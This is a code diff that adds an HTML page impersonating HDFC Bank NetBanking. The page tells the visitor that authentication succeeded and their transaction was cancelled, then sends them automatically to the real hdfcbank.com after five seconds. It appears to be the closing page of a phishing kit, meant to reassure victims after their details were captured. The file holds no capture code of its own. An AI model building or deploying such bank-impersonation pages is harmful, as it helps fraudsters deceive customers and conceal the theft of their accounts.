@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/rippleui@1.12.1/dist/css/styles.css" />
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        hdfc: '#023580',
+                    }
+                }
+            }
+        }
+    </script>
+    <title>Welcome to HDFC Bank NetBanking</title>
+</head>
+<body class="overflow-hidden">
+
+    <div class="bg-white h-[100vh] px-5">
+        <h1 class="text-hdfc text-xl font-bold py-5">Authentication successful</h1>
+
+        <div class="bg-blue-100 border border-1 border-blue-300 p-5 w-full sm:w-2/5 text-sm">
+            <p class="text-hdfc font-bold my-5">Your transaction has been cancelled. Please make sure to check your bank account to ensure cancellation.</p>
+            <p class="text-hdfc my-5">Make sure to never share your passsword with anyone who asks.</p>
+            <p class="text-hdfc font-bold my-5">Please note:</p>
+            <p class="text-hdfc my-5">You have been authenticated. You will now be redirected to login to your account.</p>
+            <p class="text-hdfc my-5">If you are not redirected automatically, <a href="https://hdfcbank.com" class="underline">click here</a>.</p>
+            <button class="btn btn-loading bg-transparent w-full text-black" disabled>Redirecting...</button>
+        </div>
+    </div>
+
+    <script>
+        window.onload = () => {
+            setTimeout(() => {
+                window.location.href = 'https://hdfcbank.com'
+            }, 5000);
+        }
+    </script>
+
+</body>
+</html>
